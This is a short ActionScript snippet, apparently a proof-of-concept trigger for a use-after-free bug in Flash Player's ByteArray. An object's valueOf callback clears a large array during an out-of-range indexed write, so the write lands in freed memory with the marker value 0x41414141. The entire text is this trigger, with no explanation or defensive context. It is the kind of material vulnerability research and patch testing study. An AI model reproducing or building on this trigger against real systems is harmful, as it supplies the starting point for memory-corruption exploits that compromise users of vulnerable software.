ba = new ByteArray();
ba.length = 0x01000000;

o = new Object();
o.valueOf = function()
{
    ba.clear();
    return 0x41414141;
}

ba[0x42424242] = o
